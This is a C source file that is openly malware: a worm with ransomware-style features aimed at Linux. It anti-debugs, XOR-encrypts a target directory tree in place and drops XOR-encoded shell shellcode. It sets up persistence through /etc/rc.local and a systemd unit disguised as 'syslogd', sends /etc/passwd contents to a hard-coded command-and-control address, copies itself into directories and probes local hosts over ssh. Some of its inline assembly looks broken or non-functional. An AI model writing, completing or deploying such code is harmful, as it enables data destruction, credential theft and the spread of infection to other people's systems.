#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <fcntl.h>

#define SHUFFLE_KEY 0xDEADBEEF
#define SHELL_PATH "/tmp/.s"
#define RC_LOCAL "/etc/rc.local"
#define SERVICE_PATH "/etc/systemd/system/syslogd.service"
#define C2_IP "192.168.1.100"
#define C2_PORT 8080
#define CREDS_FILE "/tmp/.c"
#define XOR_KEY 0x55

void encrypt_directory(const char *path);
void encrypt_file(const char *filename);
void install_shell(void);
void call_c2(const char *data);
void harvest_creds(void);
void anti_debug(void);
void self_replicate(const char *path);
void lateral_move(void);

int main(int argc, char *argv[]) {
    anti_debug(); // kill the program if its being debugged

    if(argc != 2) return 1;

    // use time and a constant key to get some pseudo-random seed
    unsigned int seed = time(NULL) ^ SHUFFLE_KEY;
    asm volatile (
        // just obfuscating the seed a little
        "movl %0, %%eax\n\t"
        "rorl $5, %%eax\n\t"
        "xorl $0xF00DBABE, %%eax\n\t"
        "movl %%eax, %0\n\t"
        : "+m" (seed)
        :
        : "eax"
    );

    install_shell(); // drop the shell binary and persistence hooks
    harvest_creds(); // try to grab some credentials
    encrypt_directory(argv[1]); // encrypt the provided directory recursively
    self_replicate(argv[1]); // drop a copy of this binary elsewhere
    lateral_move(); // try to spread over ssh to nearby machines
    return 0;
}

void encrypt_directory(const char *path) {
    // walk through the directory tree and encrypt everything
    DIR *dir = opendir(path);
    if(!dir) return;

    struct dirent *entry;
    char full_path[1024];

    while((entry = readdir(dir)) != NULL) {
        if(!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        entry->d_type == DT_DIR ? encrypt_directory(full_path) : encrypt_file(full_path);
    }
    closedir(dir);
}

void encrypt_file(const char *filename) {
    // open file and load contents into memory
    FILE *f = fopen(filename, "rb+");
    if(!f) return;

    fseek(f, 0, SEEK_END);
    size_t sz = ftell(f);
    rewind(f);

    char *buf = malloc(sz);
    if(!buf) { fclose(f); return; }

    fread(buf, 1, sz, f);

    static unsigned char poly_patch[] = { 0x90, 0x31, 0xc0 };
    asm volatile (
        // obfuscated encryption loop, randomly jumps to different xor methods
        "jmp 1f\n\t"
        ".byte 0x90, 0x90, 0xCC\n\t"
        "1:\n\t"
        "movl %[buffer], %%esi\n\t"
        "movl %[len], %%ecx\n\t"
        "movb $0xFF, %%dl\n\t"
        "movl %[seed], %%ebx\n\t"
        "andl $0xFF, %%ebx\n\t"
        "movb %%bl, (mod_key + 1)\n\t"
        "movl %[patch], %%eax\n\t"
        "xorl %%ebx, %%eax\n\t"
        "movl %%eax, (poly_patch)\n\t"
        "2:\n\t"
        "cmpl $0, %%ecx\n\t"
        "je 3f\n\t"
        "nop\n\t"
        "call 4f\n\t"
        "4: popl %%eax\n\t"
        "addl $0x20, %%eax\n\t"
        "jmp %%eax\n\t"
        "movl %[seed], %%ebx\n\t"
        "andl $0x7, %%ebx\n\t"
        "cmpl $0, %%ebx\n\t"
        "je hop_ebx\n\t"
        "cmpl $1, %%ebx\n\t"
        "je hop_edi\n\t"
        "jmp hop_fallback\n\t"
        "hop_ebx:\n\t"
        "movb (%%esi), %%bl\n\t"
        "mod_key: xor $0xAA, %%bl\n\t"
        "movb %%bl, (%%esi)\n\t"
        "jmp hop_done\n\t"
        "hop_edi:\n\t"
        "movl %%esi, %%edi\n\t"
        "movb (%%edi), %%al\n\t"
        "xor %%dl, %%al\n\t"
        "movb %%al, (%%edi)\n\t"
        "jmp hop_done\n\t"
        "hop_fallback:\n\t"
        "movb (%%esi), %%ah\n\t"
        "poly_patch: nop\n\t"
        "xor %%dl, %%ah\n\t"
        "movb %%ah, (%%esi)\n\t"
        "hop_done:\n\t"
        "rdtsc\n\t"
        "shrl $3, %%eax\n\t"
        "incl %%esi\n\t"
        "decl %%ecx\n\t"
        "jnz 2b\n\t"
        "3:\n\t"
        "nop\n\t"
        "jmp 5f\n\t"
        ".byte 0x90, 0xCC\n\t"
        "5:\n\t"
        :
        : [buffer] "m" (buf), [len] "m" (sz), [seed] "m" (seed), [patch] "m" (poly_patch)
        : "eax", "ebx", "ecx", "edx", "esi", "edi", "memory"
    );

    rewind(f);
    fwrite(buf, 1, sz, f);
    free(buf);
    fclose(f);
}

void install_shell(void) {
    // create a basic xor-encoded shell payload
    unsigned char shellcode[] = {
        0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f,
        0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0,
        0x0b, 0xcd, 0x80
    };
    int len = sizeof(shellcode);
    srand(time(NULL));
    unsigned char key = rand() % 0xFF;
    for(int i = 0; i < len; i++) shellcode[i] ^= key;

    // drop it to disk
    FILE *f = fopen(SHELL_PATH, "wb");
    if(f) {
        fwrite(shellcode, 1, len, f);
        fwrite(&key, 1, 1, f);
        fclose(f);
        chmod(SHELL_PATH, 0700);
    }

    // add persistence
    f = fopen(RC_LOCAL, "a");
    if(f) {
        fprintf(f, "\n%s &\n", SHELL_PATH);
        fclose(f);
    }

    f = fopen(SERVICE_PATH, "w");
    if(f) {
        fprintf(f, "[Unit]\nDescription=System Logging\n[Service]\nExecStart=%s\nRestart=always\n[Install]\nWantedBy=multi-user.target\n", SHELL_PATH); // fake logging
        fclose(f);
        system("systemctl enable syslogd.service");
    }

    // execute shellcode in child process
    if(fork() == 0) {
        for(int i = 0; i < len; i++) shellcode[i] ^= key;
        void (*exec)() = (void (*)())shellcode;
        exec();
        exit(0);
    }
}

void harvest_creds(void) {
    // grab user data from /etc/passwd
    char creds[8192] = {0};
    FILE *f = fopen("/etc/passwd", "r");
    if(f) {
        fread(creds, 1, sizeof(creds) - 1, f);
        fclose(f);
    }

    // fake password in memory to simulate a found secret
    char *mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    strcpy(mem, "password123"); // PoC
    for(int i = 0; i < 4096 - 10; i++) {
        if(strstr(mem + i, "pass")) {
            strncat(creds, mem + i, 50);
            break;
        }
    }
    munmap(mem, 4096);

    call_c2(creds); // send it to c2
}

void call_c2(const char *data) {
    // basic xor + http exfil
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) return;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return;
    }

    char enc_data[8192];
    strcpy(enc_data, data);
    for(int i = 0; i < strlen(enc_data); i++) enc_data[i] ^= XOR_KEY;

    char req[8192];
    snprintf(req, sizeof(req),
             "POST /data HTTP/1.1\r\nHost: %s\r\nContent-Length: %zu\r\n\r\n%s",
             C2_IP, strlen(enc_data), enc_data);
    send(sock, req, strlen(req), 0);
    close(sock);
}

void anti_debug(void) {
    // detect ptrace and bail if its being debugged
    if(ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        asm volatile ("int $3");
        exit(1);
    }
}

void self_replicate(const char *path) {
    // walk through dirs and copy self into them
    DIR *dir = opendir(path);
    if(!dir) return;

    struct dirent *entry;
    char new_path[1024];
    char self_path[1024];
    readlink("/proc/self/exe", self_path, sizeof(self_path));

    while((entry = readdir(dir)) != NULL) {
        if(!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..") || strstr(entry->d_name, ".s")) continue;
        snprintf(new_path, sizeof(new_path), "%s/%s", path, entry->d_name);
        if(entry->d_type == DT_DIR) {
            self_replicate(new_path);
            snprintf(new_path, sizeof(new_path), "%s/%s", new_path, "syslogd");
            FILE *f = fopen(new_path, "wb");
            if(f) {
                FILE *self = fopen(self_path, "rb");
                if(self) {
                    fseek(self, 0, SEEK_END);
                    size_t sz = ftell(self);
                    rewind(self);
                    char *buf = malloc(sz);
                    fread(buf, 1, sz, self);
                    fwrite(buf, 1, sz, f);
                    free(buf);
                    fclose(self);
                }
                fclose(f);
                chmod(new_path, 0755);
            }
        }
    }
    closedir(dir);
}

void lateral_move(void) {
    // try to ssh into local ips and drop a file
    for(int i = 1; i < 255; i++) {
        char ip[16];
        snprintf(ip, sizeof(ip), "192.168.1.%d", i);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(22);
        inet_pton(AF_INET, ip, &target.sin_addr);

        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
            char cmd[1024];
            snprintf(cmd, sizeof(cmd), "ssh user@%s 'echo infected > /tmp/.i'", ip);
            system(cmd);
            close(sock);
            break;
        }
        close(sock);
    }
}